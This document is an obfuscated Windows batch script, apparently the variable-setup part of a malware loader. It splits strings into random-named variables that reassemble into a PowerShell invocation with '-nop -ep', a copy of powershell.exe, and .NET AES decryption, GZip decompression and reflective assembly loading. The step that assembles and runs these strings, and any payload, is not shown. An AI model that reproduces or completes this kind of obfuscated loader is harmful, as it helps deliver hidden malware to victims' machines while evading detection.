@echo off
set "bKqakkvoDr=32"
set "sZqPArLWUM=ll"
set "vDpBdzcNHD=ow"
set "ATSKeazKIw=xe"
set "gZXVZBrNjp=ll"
set "hdQrxnOdTe= C"
set "zXiTYJbNdc=\W"
set "lvJSyflEWx=he"
set "tvInOdwxqV=rs"
set "AaWlLsoPlg=in"
set "galNdPbRdH=nd"
set "EuoYgCINvq=st"
set "WFcwTAcwie=we"
set "gujdQtVcsf=ws"
set "rzUoAbARmm=\v"
set "dpLjEjOrBc=s\"
set "OdJfaXrjFp=po"
set "wlxgrWaOtL=he"
set "ZMdcWtfSMw= /"
set "oQESasvvqX=.e"
set "jVJXvKiWfW=1."
set "TSjAVkGiFQ=co"
set "wlhaXMaeFN=Sy"
set "PAYhsaOepR=Po"
set "xYVMLUenNV=do"
set "KVwjkqHqMJ=py"
set "rdWrOQobjT=em"
set "rADDHvRRRg=y "
set "AncwYEQeht=0\"
set "EOahVgRSvs=rS"
set "fYoyPuRDVS=Wi"
set "MlSICGmsFC=:\"
set "wiCgClqaAp=we"
set "wwpqNlzXaT= %~dp0"
set "jLLDcHwxtM=cd"
set "DmQkoztisg=v, 0"
set "rOIjVvtwCX=Mode"
set "vRxOSqBZOL=Disp"
set "ozOzUNTCtp=raph"
set "VxxIypucHg=rity"
set "jRktYVfrjU=ddin"
set "pOPpEhKqkM=ARzv"
set "qBWvdxlkuc=m.IO"
set "ercxUFypLe=comm"
set "uVCNwpCxHz=lBlo"
set "mdqpFEXFVz= if "
set "MRHKjjWaJp=YfRM"
set "cKHCEnAcHq=Star"
set "KptqhAAauH=e = "
set "kIICxixpil=YfRM"
set "LpoCexkoXP=join"
set "ENSCECbSmU=, (,"
set "bhpsLGPboX=($Tl"
set "RxziKdffqq= New"
set "tIJpZFQaAC=.Cop"
set "nKWsNAbBLd=pres"
set "WrzSjKSbIr=th('"
set "wCuNmKNHVc=();$"
set "llAoPtSEsT=)))"
set "GaoyFJYfVI=ct S"
set "MhNGACSkiy=[Sys"
set "AgLpVBUGFW=ne);"
set "RAiqqcIwQe=[Sys"
set "LuUwJsKOWY=);$O"
set "qyxXbTjJIe=w) {"
set "JflTypoMGz=.Con"
set "AyBwnxbebl=.Cre"
set "JdRuUWUVCF=bstr"
set "KJecjXrFcx=le  "
set "XaCCVEkwbt=ert]"
set "vdCEqVuLvV=yste"
set "qfBNAxoncx='[-1"
set "fZsgyDkMNq=ptog"
set "ZpxdlMktaI=Xxk."
set "clWqfUxBFm=.Cry"
set "qGqTXZwBgP=1..-"
set "jscbmVhhMy=UGTu"
set "vJyrEahcVu=eam("
set "yAceBXVoiW=-ep "
set "XmfZUbhGct= = $"
set "whVEhyFWtZ=] -j"
set "vajxjORyNT=zv);"
set "KqqfNwNHMI=rans"
set "hbUcVsVFcI=stem"
set "bCWgpjuuvC=.Sec"
set "nDKofdNWUa=yste"
set "jlRqYgFSPy=();$"
set "FKRDuzqFBL=.Ass"
set "hOMMfSTjoH=n ''"
set "dgBFNyVZBD=lit("
set "KlycJxYKvA=esMa"
set "eBKrnduiCH=ARzv"
set "jrNsVXToTV=ct S"
set "crmtVnZJqm=A = "
set "cwYFCIQMKV=pose"
set "PyTxkYJpsq=ress"
set "NUirgJeHyk=-joi"
set "dpCAetQouN=m(, "
set "sMaLdXhphx=);$o"
set "IZRAqCNjoc=ion."
set "nlUnkLinMe=ring"
set "WzWKOrKpnN=M.Pa"
set "YFbqAQypwh=ress"
set "QmwxHfjfEd=;$pn"
set "xSVtuTNiIr=Secu"
set "oVKbdbMEea=; };"
set "yTgnXyjuoW=cS.T"
set "WjaXGjfgPb=:('g"
set "zVxmcqrkEH=LgUp"
set "uZPpmIaFyR=orF'"
set "eUWyxSDGeJ= '')"
set "TkLxHbFxCf=d;$o"
set "HTXmWocJpV== [S"
set "qtkRMOGQCm=bjec"
set "WZONaDpRKg=v = "
set "jhyQRKKysF=YfRM"
set "qoMzGktoxE=();$"
set "eYVugOONzO=;$Oq"
set "TamcBQAaau=tS46"
set "vfJhkGqDxd=Comp"
set "pznLvqSbiA=v = "
set "XnDYHicuqS=ose("
set "AxSquuraTF='dqR"
set "FLWswCSSUs=:: '"
set "gZHXvDKjeB=zv ="
set "bWomAAgFqL=onve"
set "yAqEoHtlwS=::('"
set "jPTydpfmpQ=$LAR"
set "VXgCiToxcR=.IO."
set "NHxVbVaydS=stem"
set "MlTDcwxisp=Syst"
set "wOQYwjJyEe=daeR"
set "gDpedryfLm=gUpA"
set "yRtKqdQDMd=null"
set "eHDrZAFICv=m.IO"
set "KmENcNMXMx==');"
set "tpTdOmNRYs=Comp"
set "EOhahpWyHH=y.Ci"
set "HXWsFknJYm=ment"
set "lvkerANZhJ=ptor"
set "dggnFMverv=BC;$"
set "pUNrkeweYx=ispo"
set "waoMNxWfph=yTo("
set "AlgrFUuRCw=YfRM"
set "dhCrKlbEFd=m.Re"
set "zrZkhOoyQa=7;$o"
set "VhWwLMcleZ=.Cry"
set "BCLlnRHIcv=.Dis"
set "syUrfERfKk=$dip"
set "IUgVXAgAwq=)($N"
set "WlqRSyodaD=nw ="
set "aofgdLwmRF=g = "
set "XmqzLUZsfZ=$yvS"
set "mAuyGQXRjP=($Tl"
set "cfMiowWeVt=-nop"
